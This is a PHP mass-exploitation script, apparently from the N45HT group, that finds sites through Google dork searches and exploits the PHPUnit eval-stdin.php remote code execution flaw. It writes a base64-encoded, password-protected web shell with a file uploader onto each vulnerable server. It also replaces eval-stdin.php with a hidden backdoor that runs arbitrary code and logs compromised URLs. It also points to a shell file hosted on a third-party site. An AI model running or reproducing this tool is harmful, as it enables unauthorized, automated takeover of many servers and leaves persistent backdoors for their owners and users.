<?php
/**
* Create bY Johny a.k.a PETR03X
* Create daY Kamis,06/20/2019
* Thank's tO my All or Other member N45HT
*/

class unit{
	public 	$dork;
	public 	$shell;
	public 	$path;
	public 	$folder;
	public 	$shell_name;
	public	 $password;
	protected $url_tmp = array();

	public function __construct(){
		print " _                              _
| |    __ _ _ __ __ ___   _____| |
| |   / _` | '__/ _` \ \ / / _ \ |
| |__| (_| | | | (_| |\ V /  __/ |
|_____\__,_|_|  \__,_| \_/ \___|_|\nPHP_auto Exploit (Rce) <\> Johny from N45HT!\nthank TO : ShinChan, Api Rahman, and YOU!\n";
	}
	private function _curl($url,$debug,$header,$reff,$code,$rt,$post,$data){
	$headers 	= array();
	$headers[] 	= 'Content-Type: application/x-www-form-urlencoded'
	;
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL,$url);
		if($reff!=null){
		curl_setopt($ch, CURLOPT_REFERER, $reff);
		}else{
		curl_setopt($ch, CURLOPT_AUTOREFERER, true);
		}
		curl_setopt($ch, CURLOPT_VERBOSE, $debug);
		if($header){
		curl_setopt($ch, CURLOPT_HEADER, $header);
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
		}

		if($post){
		curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
		curl_setopt($ch, CURLOPT_POSTFIELDS,['data'=>$data]);
		}
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,0);
		curl_setopt($ch, CURLOPT_TIMEOUT, 120);
		
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, $rt);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_USERAGENT,'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36');
		
		curl_setopt($ch, CURLOPT_COOKIESESSION, true);
		curl_setopt($ch, CURLOPT_COOKIEJAR, '.cookie');
		curl_setopt($ch, CURLOPT_COOKIEFILE, '.cookie');
		
		$out = curl_exec($ch);
		$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
		curl_close($ch);
		if($code){
			return $http_code;
		}else{
			return $out;
		}
	}

	private function save($file,$resource,$permission){
		$o = fopen($file,$permission);
		fwrite($o,$resource);
		fclose($o);
	}

	private function url_sort($url){
		$vendor = preg_match_all("#(.*?)\/vendor/#i",$url, $o) ? $o[1][0]:false;
		if($vendor){
			return $vendor."/vendor";
		}else{
			$free = pathinfo($url);
			return $free['dirname']."/vendor";
		}
	}
	
	private function exploit($url, $ver){
		$payload= 'PD9waHAKc2Vzc2lvbl9zdGFydCgpOwpAaW5pX3NldCgnb3V0cHV0X2J1ZmZlcmluZycsIDApOwpAaW5pX3NldCgnZGlzcGxheV9lcnJvcnMnLCAwKTsKc2V0X3RpbWVfbGltaXQoMCk7CmluaV9zZXQoJ21lbW9yeV9saW1pdCcsICc2NE0nKTsKaGVhZGVyKCdDb250ZW50LVR5cGU6IHRleHQvaHRtbDsgY2hhcnNldD1VVEYtOCcpOwppZihpc3NldCgkX1NFU1NJT05bJ3VzZXInXSkgYW5kICFlbXB0eSgkX1NFU1NJT05bJ3VzZXInXSkpewplY2hvIHBocF91bmFtZSgpOwplY2hvICc8Zm9ybSBhY3Rpb249IiIgbWV0aG9kPSJwb3N0IiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIiBuYW1lPSJ1cGxvYWRlciIgaWQ9InVwbG9hZGVyIj4nOwplY2hvICc8aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0iZmlsZSIgc2l6ZT0iNTAiPjxpbnB1dCBuYW1lPSJfdXBsIiB0eXBlPSJzdWJtaXQiIGlkPSJfdXBsIiB2YWx1ZT0iVXBsb2FkIj48L2Zvcm0+JzsKaWYgKCRfUE9TVFsnX3VwbCddID09ICJVcGxvYWQiKSB7CiAgICBpZiAoQGNvcHkoJF9GSUxFU1snZmlsZSddWyd0bXBfbmFtZSddLCAkX0ZJTEVTWydmaWxlJ11bJ25hbWUnXSkpIHsKICAgICAgICBlY2hvICdVcGxvYWQgb2sgOkQgISEhJzsKICAgIH0gZWxzZSB7CiAgICAgICAgZWNobyAnVXBsb2FkIEZhaWwgISEhJzsKICAgIH0KfQp9ZWxzZXsKZWNobyAnPGNlbnRlcj4nOwplY2hvICc8Zm9ybSBhY3Rpb249IiIgbWV0aG9kPSJwb3N0Ij4nOwplY2hvICc8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0idXNlciIgc2l6ZT0iNTAiPjxpbnB1dCB0eXBlPSJzdWJtaXQiIG5hbWU9Il9sb2dpbiIgaWQ9Il9sb2dpbiIgdmFsdWU9IkxPR0lOIj48L2Zvcm0+JzsKfQppZigkX1BPU1RbJ19sb2dpbiddID09ICJMT0dJTiIgYW5kIG1kNSgkX1BPU1RbInVzZXIiXSk9PSAnOTU3MmI4YWZlYWM2NmIyZGU2YmU4OWVmZjBjMGQ5N2MnKSB7CiRfU0VTU0lPTlsndXNlciddPSdONDVIVCc7Cn0='; 
		$pattern   = '<?php echo("PETR03X_WAS_HERE");fwrite(fopen("'.$this->shell_name.'","w"),base64_decode("'.base64_encode(str_replace('9572b8afeac66b2de6be89eff0c0d97c',md5($this->password),base64_decode($payload))).'")); ?>';
		$delete = '<?php fwrite(fopen("eval-stdin.php","w"),base64_decode("PD9waHAgaWYobWQ1KCRfR0VUWyd1c2VyJ10pPT0nOTM2YTM1ZDFmMzE5OTJlZGQ2YzJkMWQ3MjVkYmVkOGMnKXtldmFsKCc/PicgLiBmaWxlX2dldF9jb250ZW50cygncGhwOi8vc3RkaW4nKSk7fT8+"));?>';
		$url_ = $this->url_sort($url);
		print "[ - ] $url_ \n";
		$http_code = $this->_curl($url_.$this->path,false,false,null,true,true,false,null);
		print "[ - ] Respon : [ $http_code ]\n";
		print "[ - ] Version: [ $ver ]\n";
		if($http_code=='200' or $http_code=='302' or $http_code=='0'){
		$uname = preg_match('#PETR03X#is', $this->_curl($url_.$this->path,false,false,null,false,true,true,$pattern))? 'true':'false';
		print "[ - ] Vulner : [ $uname ]\n";
		
		if($uname=='true'){
			/**
			print "[ - ] TESTING UPLOAD SHELL!\n";
			$this->_curl($url_.$this->path,false,false,null,false,true,true,$shell);
			*/
			print "[ - ] CHECKING FILE!\n";
			if($this->_curl($url_.$this->folder.$this->shell_name,false,false,null,true,true,false,null)=='200'){
			    $this->_curl($url_.$this->path,false,false,null,false,true,true,$delete);
				print "[ - ] EXPLOIT SUCESS!\n";
			    $this->save("result.txt",$url_.$this->folder.$this->shell_name."\n",'a');
			}else{
				print "[ - ] EXPLOIT FAILED!\n";
			    $this->save("revisi.txt",$url_.$this->folder.$this->shell_name."\n",'a');
			}

		}else{
			print "[ - ] STATUS : [ NOT VULN ] \n";
		}
		}else{
			print "[ - ] STATUS : [ NOT VULN ] \n";
		}
	}

	private function parse_version($url){
		$url = dirname($url);
		$version_o = json_decode($this->_curl($url.'/composer.json',false,false,null,false,true,false,null), true);
		$version = str_replace(['~','^','.','*','>','<','='],'' , $version_o['require-dev']['phpunit/phpunit']);
		if(isset($version) and !empty($version)){
			return ['ver'=>$version,'ver2'=>$version_o['require-dev']['phpunit/phpunit']];
		}else{
			return ['ver'=>'Unknow','ver2'=>'Unknow'];
		}
		
	}
	
	public function grab(){
	sleep(1);
	//@unlink('.cookie');
	static $jua = 0;
	static $se= "https://www.google.com";
	$host="/search?q=".$this->dork;
	$tmp_url = "https://www.google.com/";
	
		while(1){
		//system('clear');
			$data_site = $this->_curl($se.$host,false,true,$tmp_url,false,true,false ,null);
			$data = preg_match_all('#<div class="r"><a href="(.*?)" ping=#is', $data_site, $o) ? $o[1] : null;
			
if($data==null and $jua==0){
	print "[ - ] RESULT IS EMPTY LOSS IN THE DARK! \n";
	exit;
}elseif($data==null and $jua>0){
	print "[ - ] OH NO GOOGLE BAN ME !\n";
}
if(is_array($data)){
	 print"\n\nScanning Page : $jua\n";
	 $count = count($data);
	 $urls_ = array_unique($data);sort($urls_);
	 foreach($urls_ as $site){
	 $site = $this->url_sort(html_entity_decode($site));
	 
	 if(!in_array($site,$this->url_tmp)){
	 $this->url_tmp[] = $site;
	 $vers = $this->parse_version($site);
     self::exploit($site, $vers['ver2']);
/*
	 if($vers['ver']<='56' and $vers['ver2']!='Unknow'){
		self::exploit($site, $vers['ver2']);
	}elseif($vers['ver']=='Unknow' or strlen($vere['ver']) > 2){
		self::exploit($site, $vers['ver2']);
	}else{
		print"[ - ] ".$this->url_sort($site)."\n[ - ] Version : [ ".$vers['ver2']." ]\n[ - ] STATUS  : [ NOT VULN ]\n";
	}
	*/
    }else{
    	print"[ - ] ".$this->url_sort($site)."\n[ - ] STATUS : [ UDAH PERNAH DI SCAN ]\n";
    }
		//print $site."\n";
		print"============================================\n";
    $jum++;
   }
   }
   	$jua++;
	$tmp_url = $se.$host;
	$host = preg_match_all('#</a></td><td aria-level="3" class="b navend" role="heading"><a class="pn" href="(.*?)" id="pnnext" style="text-align:left">#is', $data_site, $o) ? html_entity_decode($o[1][0]) : null;
 	   if($host==null){
 	    print"\nScanning Selesai...\nTotal Web Yang Di Scan : ".$jum."\n";
 	    exit;
 	   }
   }

	}
}
$process = new unit();
/** =========[ OPTION ] ========== **/
 // Setting URL RAW SHELL KALIAN
$process->shell = "http://www.ladimoradelsole.it/joomla/media/shell.txt";
// Setting nama shell yg akan di buat pada server target
$process->shell_name = "k3-.php";
// Setting password
$process->password = 'N45HT';
// Setting PATH EXPLOIT / BUG
$process->path  = "/phpunit/phpunit/src/Util/PHP/eval-stdin.php";
 // Setting OUTPUT SHELL
$process->folder= "/phpunit/phpunit/src/Util/PHP/";
/** =========[ INPUT ] ========== **/
if(isset($argv[1]) and !empty($argv[1])){
	$process->dork = urlencode($argv[1]);
}else{
	print "usage: $argv[0] dork_google\n";
	exit;
	}
/** =========[ ENGINE ] ========== **/
$process->grab();